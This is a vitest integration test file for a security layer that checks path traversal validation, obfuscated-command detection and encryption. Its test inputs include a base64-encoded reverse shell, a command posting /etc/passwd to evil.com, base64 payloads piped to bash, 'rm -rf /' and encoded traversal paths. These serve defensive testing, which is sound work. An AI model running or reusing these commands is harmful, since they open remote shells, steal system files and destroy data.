/**
 * Integration tests for Security Layer Phase 2
 *
 * Tests the interaction between path traversal prevention,
 * command obfuscation detection, and existing security features.
 */

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it, beforeEach, afterEach } from "vitest";
import { CommandObfuscationDetector } from "./command-obfuscation.js";
import { EncryptionService } from "./encryption.js";
import { PathTraversalValidator } from "./path-traversal.js";

describe("Security Layer Phase 2 - Integration", () => {
  let tempDir: string;
  let dataDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "security-integration-"));
    dataDir = path.join(tempDir, "data");
    fs.mkdirSync(dataDir, { recursive: true });
  });

  afterEach(() => {
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe("Multi-Layer File Operations", () => {
    it("should validate path and encrypt file content", () => {
      // Setup
      const validator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
        allowNonExistent: true,
      });
      const encryption = new EncryptionService({
        key: EncryptionService.generateKey(),
      });

      // User input
      const userFilename = "secrets.txt";
      const userContent = "password123";

      // 1. Validate path
      const safePath = validator.validateOrThrow(path.join(dataDir, userFilename));
      expect(safePath).toContain(dataDir);

      // 2. Encrypt content
      const encrypted = encryption.encryptToString(userContent);
      expect(encrypted).not.toContain(userContent);

      // 3. Write encrypted content
      fs.writeFileSync(safePath, encrypted);

      // 4. Read and decrypt
      const stored = fs.readFileSync(safePath, "utf8");
      const decrypted = encryption.decryptFromString(stored);
      expect(decrypted).toBe(userContent);
    });

    it("should reject path traversal before any file operation", () => {
      const validator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
      });

      // Attempt path traversal
      const maliciousPath = path.join(dataDir, "../../etc/passwd");

      expect(() => {
        validator.validateOrThrow(maliciousPath);
      }).toThrow("Path validation failed");

      // File operation never happens
    });
  });

  describe("Multi-Layer Command Execution", () => {
    it("should detect obfuscation before command execution", () => {
      const detector = new CommandObfuscationDetector();

      // Malicious encoded command
      const maliciousCommand = "echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash";

      // Detect obfuscation
      const result = detector.detect(maliciousCommand);

      expect(result.detected).toBe(true);
      expect(result.techniques.length).toBeGreaterThan(0);
      expect(result.confidence).toBeGreaterThan(0.5);

      // Command should be blocked
      if (result.detected && result.confidence > 0.7) {
        // Don't execute
        expect(true).toBe(true);
      }
    });

    it("should allow safe commands through", () => {
      const detector = new CommandObfuscationDetector();

      // Safe command
      const safeCommand = "echo Hello World";

      const result = detector.detect(safeCommand);

      expect(result.detected).toBe(false);
      expect(result.confidence).toBe(0);

      // Safe to execute (in sandbox)
    });
  });

  describe("Combined Path and Command Validation", () => {
    it("should validate both path and command in a workflow", () => {
      const pathValidator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
        allowNonExistent: true,
      });
      const commandDetector = new CommandObfuscationDetector();

      // User wants to write a script to a file
      const scriptPath = path.join(dataDir, "script.sh");
      const scriptContent = "#!/bin/bash\necho 'Hello from script'";

      // 1. Validate path
      const safePath = pathValidator.validateOrThrow(scriptPath);
      expect(safePath).toContain(dataDir);

      // 2. Check script content for obfuscation
      const obfuscation = commandDetector.detect(scriptContent);
      expect(obfuscation.detected).toBe(false);

      // 3. Write script
      fs.writeFileSync(safePath, scriptContent);

      // 4. Verify
      expect(fs.existsSync(safePath)).toBe(true);
    });

    it("should block workflow if either validation fails", () => {
      const pathValidator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
      });
      const commandDetector = new CommandObfuscationDetector();

      // Malicious scenario: traversal + obfuscated command
      const maliciousPath = path.join(dataDir, "../../tmp/evil.sh");
      const maliciousScript = "echo SGFja2VkCg== | base64 -d | bash";

      // Path validation fails first
      expect(() => {
        pathValidator.validateOrThrow(maliciousPath);
      }).toThrow();

      // Even if path was valid, command would be caught
      const obfuscation = commandDetector.detect(maliciousScript);
      expect(obfuscation.detected).toBe(true);
      expect(obfuscation.confidence).toBeGreaterThan(0.6);
    });
  });

  describe("Real-World Attack Scenarios", () => {
    it("should block encoded reverse shell attempt", () => {
      const detector = new CommandObfuscationDetector();

      // Real reverse shell payload (base64 encoded)
      const reverseShell =
        "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84MDgwIDA+JjE= | base64 -d | bash";

      const result = detector.detect(reverseShell);

      expect(result.detected).toBe(true);
      expect(result.techniques.length).toBeGreaterThan(0);
      expect(result.confidence).toBeGreaterThan(0.6);
    });

    it("should block data exfiltration attempt with path traversal", () => {
      const pathValidator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
      });
      const commandDetector = new CommandObfuscationDetector();

      // Attempt to read /etc/passwd and send to attacker
      const exfilPath = "../../../../etc/passwd";
      const exfilCommand = "cat /etc/passwd | curl -X POST http://evil.com/data";

      // Path validation blocks the read
      const pathResult = pathValidator.validate(path.join(dataDir, exfilPath));
      expect(pathResult.valid).toBe(false);

      // Command detection blocks the exfiltration
      const cmdResult = commandDetector.detect(exfilCommand);
      expect(cmdResult.detected).toBe(true);
      expect(cmdResult.techniques).toContain("shell-metacharacters");
    });

    it("should block privilege escalation via symlink and sudo", () => {
      const commandDetector = new CommandObfuscationDetector();

      // Privilege escalation command
      const escalateCommand = "sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'";

      const result = commandDetector.detect(escalateCommand);

      expect(result.detected).toBe(true);
      expect(result.techniques.length).toBeGreaterThan(0);

      // If attacker creates symlink to /etc/sudoers
      // Path validation with symlink resolution would catch it
    });
  });

  describe("Performance Under Load", () => {
    it("should handle many validations efficiently", () => {
      const pathValidator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
        allowNonExistent: true,
      });
      const commandDetector = new CommandObfuscationDetector();

      const iterations = 1000;
      const start = Date.now();

      for (let i = 0; i < iterations; i++) {
        // Path validation
        pathValidator.validate(path.join(dataDir, `file${i}.txt`));

        // Command detection
        commandDetector.detect(`echo "test ${i}"`);
      }

      const elapsed = Date.now() - start;

      // Should complete 1000 iterations in under 2 seconds
      expect(elapsed).toBeLessThan(2000);
      console.log(`Performance: ${iterations} iterations in ${elapsed}ms`);
    });
  });

  describe("Integration with Encryption", () => {
    it("should validate, encrypt, and store sensitive data", () => {
      const pathValidator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
        allowNonExistent: true,
      });
      const encryption = new EncryptionService({
        key: EncryptionService.generateKey(),
      });

      // Sensitive data from user
      const userData = {
        username: "john",
        apiKey: "sk_live_12345",
        password: "secret123",
      };

      // 1. Validate storage path
      const storagePath = path.join(dataDir, "user-credentials.enc");
      const safePath = pathValidator.validateOrThrow(storagePath);

      // 2. Encrypt sensitive data
      const encrypted = encryption.encryptToString(JSON.stringify(userData));

      // 3. Store encrypted data
      fs.writeFileSync(safePath, encrypted);

      // 4. Retrieve and decrypt
      const stored = fs.readFileSync(safePath, "utf8");
      const decrypted = JSON.parse(encryption.decryptFromString(stored));

      expect(decrypted).toEqual(userData);

      // 5. Verify encryption - file content should not contain plaintext
      const fileContent = fs.readFileSync(safePath, "utf8");
      expect(fileContent).not.toContain("john");
      expect(fileContent).not.toContain("sk_live_12345");
      expect(fileContent).not.toContain("secret123");
    });
  });

  describe("Defense in Depth", () => {
    it("should demonstrate layered security approach", () => {
      // Layer 1: Path Validation
      const pathValidator = new PathTraversalValidator({
        allowedBasePaths: [dataDir],
      });

      // Layer 2: Command Validation
      const commandDetector = new CommandObfuscationDetector();

      // Layer 3: Encryption (would encrypt data at rest)

      // Attacker tries multiple bypasses
      const attacks = [
        { path: "../../etc/passwd", cmd: "cat /etc/passwd | curl http://evil.com" },
        { path: "%2e%2e%2fetc%2fpasswd", cmd: "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash" },
        { path: "data\0.txt", cmd: "bash -c 'rm -rf /'" },
      ];

      for (const attack of attacks) {
        // Layer 1 blocks path traversal
        const pathResult = pathValidator.validate(attack.path);
        expect(pathResult.valid).toBe(false);

        // Layer 2 blocks malicious commands
        const cmdResult = commandDetector.detect(attack.cmd);
        expect(cmdResult.detected).toBe(true);

        // Even if both passed, Layer 3 encrypts data at rest
        // So compromised data would still be encrypted
      }
    });
  });
});
